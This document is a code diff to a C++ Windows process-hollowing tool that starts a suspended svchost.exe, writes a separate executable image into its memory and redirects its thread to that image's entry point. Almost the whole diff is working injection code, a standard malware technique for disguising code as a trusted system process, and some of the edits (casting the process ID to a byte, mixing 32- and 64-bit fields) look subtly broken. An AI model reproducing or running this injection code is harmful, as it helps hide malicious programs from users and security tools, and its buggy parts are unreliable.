@@ -6,7 +6,7 @@
 
 using namespace std;
 
-string processPATH = "C:\\Windows\\SysWOW64\\cmd.exe";
+string processPATH = "C:\\Windows\\System32\\svchost.exe";
 string payloadPATH = "helloworld.exe";
 
 struct AppConfig{
@@ -166,7 +166,7 @@ bool CreateProcess(){
         return 0;
     }
 
-    LogInfo("Process PID", to_string((uintptr_t)proc_info.dwProcessId));
+    LogInfo("Process PID", to_string((BYTE)proc_info.dwProcessId));
     return 1;
 }
 
@@ -201,22 +201,14 @@ bool LoadNTDLLFunctions(){
 }
 
 PPEB pPEB;
-typedef struct _PROCESS_BASIC_INFORMATION_LOCAL {
-	PVOID Reserved1;
-	DWORD PebBaseAddress;
-	PVOID Reserved2[2];
-	DWORD UniqueProcessId;
-	PVOID Reserved3;
-} PROCESS_BASIC_INFORMATION_LOCAL;
-
 bool GetProcessPEB(){
     LogNoti("Getting PEB...");
-    PROCESS_BASIC_INFORMATION_LOCAL proc_baseinfo = {};
+    PROCESS_BASIC_INFORMATION proc_baseinfo = {};
     f_NtQueryInformationProcess(
         proc_info.hProcess,
         ProcessBasicInformation,
         &proc_baseinfo,
-        sizeof(PROCESS_BASIC_INFORMATION_LOCAL),
+        sizeof(PROCESS_BASIC_INFORMATION),
         NULL
     );
 
@@ -225,6 +217,15 @@ bool GetProcessPEB(){
         LogError("Error getting PEB");
         return 0;
     }
+
+    LPCONTEXT pContext = new CONTEXT();
+    pContext->ContextFlags = CONTEXT_ALL;
+
+    if (!GetThreadContext(proc_info.hThread, pContext)){
+        LogError("Error getting context");
+        return 0;
+    }
+
     LogInfo("PEB at address", GetAddress(pPEB));
     return 1;
 }
@@ -232,10 +233,9 @@ bool GetProcessPEB(){
 PVOID pImageBase;
 bool GetImageBase(){
     LogNoti("Getting image base...");
-    PVOID bruh = (PVOID)((uintptr_t)pPEB + 0x8);
     ReadProcessMemory(
         proc_info.hProcess,
-        (LPCVOID)((uintptr_t)pPEB + 0x8),
+        (LPCVOID)((BYTE*)pPEB + 0x8),
         &pImageBase,
         8,
         NULL
@@ -278,29 +278,10 @@ bool AllocateMemory(){
     return 1;
 }
 
-DWORD dwDelta;
-
-typedef struct _BASE_RELOCATION_BLOCK {
-    DWORD PageAddress;
-    DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
-
-typedef struct _BASE_RELOCATION_ENTRY {
-    WORD Offset : 12;
-    WORD Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
-
-DWORD CountRelocationEntries(DWORD dwBlockSize) {
-    return (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-}
-
 bool CopySourceImage(){
     LogNoti("Copying source image to memory...");
-    dwDelta = (DWORD)pImageBase - optionalHeader.ImageBase;
-    optionalHeader.ImageBase = (DWORD64)pImageBase;
-
     LogNoti("Writing headers...");
-	DWORD dwSize = GetFileSize(hFile, 0);
+    
     if (!WriteProcessMemory(
         proc_info.hProcess,
         pImageBase,
@@ -314,14 +295,15 @@ bool CopySourceImage(){
     }
         
     for (int i = 0; i < fileHeader.NumberOfSections; i++){
-        PVOID destination = (PVOID)((uintptr_t)pImageBase + sectionHeader[i].VirtualAddress); 
+        PVOID destination = (PVOID)((BYTE*)pImageBase + sectionHeader[i].VirtualAddress); 
+        PVOID pSourceSection = (PVOID)((BYTE*)pSourceImage + sectionHeader[i].PointerToRawData);
         LogInfo("Writing \033[33m" + string(sectionHeader[i].Name, sectionHeader[i].Name + 8) + "\033[0m to", GetAddress(destination));
 
         if (!WriteProcessMemory(
             proc_info.hProcess,
             destination,
-            (LPVOID)((BYTE*)pSourceImage + sectionHeader[i].PointerToRawData),
-            sectionHeader[i].SizeOfRawData,
+            pSourceSection,
+            sectionHeader[i].SizeOfRawData, 
             NULL
         ))
         {
@@ -332,97 +314,20 @@ bool CopySourceImage(){
     return 1;
 }
 
-bool RelocatePointers(){
-    LogNoti("Relocating pointers...");
-    
-    DWORD dwRelocAddr = 0;
-    for (DWORD x = 0; x < fileHeader.NumberOfSections; x++)
-    {
-        if (strcmp((char*)sectionHeader[x].Name, ".reloc") == 0)
-        {
-            dwRelocAddr = sectionHeader[x].PointerToRawData;
-            break;
-        }
-    }
-    
-    if (!dwRelocAddr) {
-        LogNoti("No relocation section found");
-        return 1;
-    }
-
-    DWORD dwOffset = 0;
-    IMAGE_DATA_DIRECTORY relocData = 
-        optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
-    while (dwOffset < relocData.Size)
-    {
-        PBASE_RELOCATION_BLOCK pBlockheader = 
-            (PBASE_RELOCATION_BLOCK)((BYTE*)pSourceImage + dwRelocAddr + dwOffset);
-
-        dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-
-        DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
-
-        PBASE_RELOCATION_ENTRY pBlocks = 
-            (PBASE_RELOCATION_ENTRY)((BYTE*)pSourceImage + dwRelocAddr + dwOffset);
-
-        for (DWORD y = 0; y < dwEntryCount; y++)
-        {
-            dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-            if (pBlocks[y].Type == 0)
-                continue;
-
-            DWORD dwFieldAddress = 
-                pBlockheader->PageAddress + pBlocks[y].Offset;
-
-            DWORD dwBuffer = 0;
-            ReadProcessMemory
-            (
-                proc_info.hProcess, 
-                (PVOID)((DWORD)pImageBase + dwFieldAddress),
-                &dwBuffer,
-                sizeof(DWORD),
-                NULL
-            );
-
-            dwBuffer += dwDelta;
-
-            BOOL bSuccess = WriteProcessMemory
-            (
-                proc_info.hProcess,
-                (PVOID)((DWORD)pImageBase + dwFieldAddress),
-                &dwBuffer,
-                sizeof(DWORD),
-                NULL
-            );
-
-            if (!bSuccess)
-            {
-                LogError("Error writing relocation");
-                return 0;
-            }
-        }
-    }
-    
-    LogSuccess("Pointers relocated successfully");
-    return 1;
-}
-
 bool SetThreadContext(){
     LogNoti("Setting thread context...");
-	DWORD dwEntrypoint = (DWORD)pImageBase + optionalHeader.AddressOfEntryPoint;
-
+    
     LPCONTEXT pContext = new CONTEXT();
-    pContext->ContextFlags = CONTEXT_ALL;
-
+    pContext->ContextFlags = CONTEXT_INTEGER;
+    
     if (!GetThreadContext(proc_info.hThread, pContext)){
         LogError("Error getting context");
         return 0;
     }
+    DWORD dwEntrypoint = (DWORD)pImageBase + optionalHeader.AddressOfEntryPoint;
     LogInfo("Old entry point", GetAddress((PVOID)pContext->Eax));
     LogInfo("New entry point", GetAddress((PVOID)dwEntrypoint));
-
+    
     pContext->Eax = dwEntrypoint;			
     if (!SetThreadContext(proc_info.hThread, pContext)){
         LogError("Error setting context");
@@ -446,7 +351,6 @@ int main(int argc, char* argv[]){
     if (!HollowProcess()) {return 0;} Pause();
     if (!AllocateMemory()) {return 0;} Pause();
     if (!CopySourceImage()) {return 0;} Pause();
-    // if (!RelocatePointers()) {return 0;}
     if (!SetThreadContext()) {return 0;} Pause();
 
     LogSuccess("All done! Resuming thread...");
